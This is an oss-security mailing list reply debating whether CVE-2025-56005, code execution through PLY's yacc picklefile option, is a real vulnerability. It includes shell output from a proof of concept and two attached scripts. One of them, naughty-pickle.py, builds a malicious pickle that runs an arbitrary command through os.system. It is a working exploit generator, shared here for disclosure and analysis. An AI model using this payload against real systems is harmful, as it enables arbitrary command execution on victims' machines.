Received: (qmail 23723 invoked by uid 550); 29 Jan 2026 16:26:14 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 23692 invoked from network); 29 Jan 2026 16:26:14 -0000
Authentication-Results:garm.ovh; auth=pass (GARM-105G00651b07794-6fca-43fd-9270-c224ff618729,
                    06AAD7B92A7D4C13765BA338412EB3DCB8890B48) smtp.auth=jwilk@jwilk.net
X-OVh-ClientIp:37.248.226.83
Date: Thu, 29 Jan 2026 17:26:02 +0100
From: Jakub Wilk <jwilk@jwilk.net>
To: oss-security@lists.openwall.com
Message-ID: <20260129162602.46ymqnlk2ixipsjn@jwilk.net>
Mail-Followup-To: oss-security@lists.openwall.com
References: <7d323bf4-91fb-4bee-aed4-e5f3757c3631@oracle.com>
 <072c05eb-c9fe-46b1-9601-552ca09cb083@oracle.com>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="lfggu2t4qq4mpcct"
Content-Disposition: inline
In-Reply-To: <072c05eb-c9fe-46b1-9601-552ca09cb083@oracle.com>
X-Ovh-Tracer-Id: 9951829280064351441
X-VR-SPAMSTATE: OK
X-VR-SPAMSCORE: 0
X-VR-SPAMCAUSE: dmFkZTGmMqXKocdJDdgRbWWb6/wU71D9xeZJ508Z3I273H3AavAyaE2SrbpUH6ehywl497pMJ4pLYVGIbF2X8YFMuJoBIaSHGiB3Z6yiw+vawWOI8U+fSy4a/zJAo+2jd7qGEdeSaYXqNQ34Q36fRQt1IyMa6caol273vVDHKbdpjD9zk1vlZNhuJ0KYLK1I1T0g9J2gatVJC2adRh+g5C+adkmuLIK01AWRmDAfd1XD/OvIrW8lMcObNoJ+7SzXf9/j3rgXBO2P7/7GQhJT4pl5h+NuQmuv0Kmu4xNVL/gnNroBeUK5VGrIO/QvdGiaWmBt1+VI+MChGrsV42xY/GVay+apsJRe35tctxwedd1vUzj6aktIhYVZ+zPosj8VptEu/8g2gr8hyKOZ1mcbhx/jy1zBNmhFudJN4Q4g7+HlZMhEzD9AqNbSo20yc/q5qvHGY4EWlz40+kZisHqBZ5i9oSBitVSl0vZM0mNnUkaQp7T99gGl8klb9oDtiSj2IWShzNzQoVe/jrr498GAqW6ZLiOilKKYevBJMeWtbLPpoBijETWU/Pl24Wp0kAgTMCiHcI8I4KWYrLz3tGqLV9QQ1aDQOpiiM5fPEYXTxzYj5dTEYbYg2UbFtUVLI4BkQRtHysPWyH99YXFaS1uJrFGHdD1Gd9i71gwXAgDp0QYI5QfPjA
Subject: Re: [oss-security] CVE-2025-56005 Undocumented RCE in PLY via
 `picklefile` Parameter

--lfggu2t4qq4mpcct
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Disposition: inline

It looks like the pickling feature was removed in 
https://github.com/dabeaz/ply/commit/1fac9fed647909b9 (Feb 2020, 
"Massive refactoring/cleanup"), but that didn't make it into a release. 
But anyway...

* Alan Coopersmith <alan.coopersmith@oracle.com>, 2026-01-28 14:10:
>https://www.cve.org/CVERecord?id=CVE-2025-56005 has added to the 
>references a link to https://github.com/tom025/ply_exploit_rejection 
>which argues that this CVE should be rejected because:
[...]
>>Run
>>
>>    uv run main.py
>>
>>This will run the proof of concept. This results in the program 
>>exiting early with a `AttributeError: 'function' object has no 
>>attribute 'input'`.

I don't know what uv is, but the PoC almost works for me:

    $ python3 -m pip install ply
    Collecting ply
      Downloading ply-3.11-py2.py3-none-any.whl.metadata (844 bytes)
    Downloading ply-3.11-py2.py3-none-any.whl (49 kB)
    Installing collected packages: ply
    Successfully installed ply-3.11

    $ cat /tmp/pwned
    cat: /tmp/pwned: No such file or directory

    $ python3 main.py
    WARNING: yacc table file version is out of date
    WARNING: no p_error() function is defined
    Traceback (most recent call last):
      File "/home/jwilk/ply_exploit_rejection/main.py", line 35, in <module>
        parser.parse('example')
      File ".../lib/python3.12/site-packages/ply/yacc.py", line 333, in parse
        return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
      File ".../lib/python3.12/site-packages/ply/yacc.py", line 1018, in parseopt_notrack
        lexer = lex.lexer
                ^^^^^^^^^
    AttributeError: module 'ply.lex' has no attribute 'lexer'. Did you mean: 'Lexer'?

The AttributeError is PLY's weird way of saying that you forgot to 
create the lexer. Indeed, the PoC imports the lex() function from 
ply.lex, and then never uses it. But despite that, the planted code was 
executed:

    $ cat /tmp/pwned
    VULNERABLE

>>## Argument 2: The proof of concept does not demonstrate Arbitrary 
>>Code Execution as claimed ##
>>
>>Referring to the proof of concept code this does not demonstrate 
>>Arbitrary Code Execution as there is a single program running and no 
>>untrusted data has been passed between processes. This is not a 
>>demonstration of CWE-502 as claimed.

Meh. The author of the PoC took a shortcut by putting the code that 
generates the malicious pickle and the code that runs the parser in the 
same process, but it doesn't have to be that way. It'd be trivial to 
move the two parts into separate programs.

I've attached a revised PoC:

    $ printf example | python3 parser.py
    example
    $ python3 naughty-pickle.py cowsay pwned > parser.pkl
    $ printf example | python3 parser.py
     _______
    < pwned >
     -------
            \   ^__^
             \  (oo)\_______
                (__)\       )\/\
                    ||----w |
                    ||     ||
    WARNING: yacc table file version is out of date
    example

So there is no doubt that if you let PLY read pickles from untrusted 
source, code execution is possible. But is it really a bug in PLY, or a 
bug in the code that uses PLY in such a foolish way?

-- 
Jakub Wilk

--lfggu2t4qq4mpcct
Content-Type: text/x-python; charset=us-ascii
Content-Disposition: attachment; filename="parser.py"
Content-Transfer-Encoding: quoted-printable

import sys

from ply.lex import lex
from ply.yacc import yacc

tokens =3D ('EXAMPLE',)

def t_EXAMPLE(t):
    'example'
    return t

def t_error(t):
    return

def p_sample(p):
    'sample : EXAMPLE'
    p[0] =3D p[1]

def p_error(p):
    return

lex()
parser =3D yacc(picklefile=3D'parser.pkl', debug=3DFalse)
print(parser.parse(sys.stdin.read()))

--lfggu2t4qq4mpcct
Content-Type: text/x-python; charset=us-ascii
Content-Disposition: attachment; filename="naughty-pickle.py"

import os
import pickle
import sys

class Pwn:
    def __reduce__(self):
        cmd = str.join(' ', sys.argv[1:])
        return os.system, (cmd,)

pickle.dump(Pwn(), sys.stdout.buffer)

--lfggu2t4qq4mpcct--
